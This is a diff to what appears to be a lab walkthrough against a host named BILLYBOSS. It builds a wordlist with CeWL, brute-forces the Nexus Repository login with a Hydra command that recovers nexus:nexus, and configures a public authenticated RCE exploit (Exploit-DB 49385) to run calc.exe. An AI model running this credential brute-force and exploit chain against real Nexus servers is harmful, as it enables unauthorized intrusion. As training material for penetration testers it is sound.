@@ -78,5 +78,23 @@ okay, so he uses a wordlist.
 ```sh
 cewl --lowercase http://BILLYBOSS:8081/ | grep -v CeWL > wordlists.txt
 
-hydra -I -f -L wordlists.txt -P wordlists.txt “http-post-form://BILLYBOSS:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403”
+hydra -I -f -L wordlists.txt -P wordlists.txt "http-post-form://BILLYBOSS:8081/service/rapture/session:username=^USER64^&password=^PASS64^:F=403"
+
+# [8081][http-post-form] host: BILLYBOSS   login: nexus   password: nexus
+```
+
+cool, the cred is `nexus:nexus`.
+
+now we can use this RCE auth'd vuln
+
+https://www.exploit-db.com/exploits/49385
+
+```python
+# 49385.py
+
+URL='http://BILLYBOSS:8081'
+CMD='cmd.exe /c calc.exe'
+USERNAME='nexus'
+PASSWORD='nexus'
+
 ```
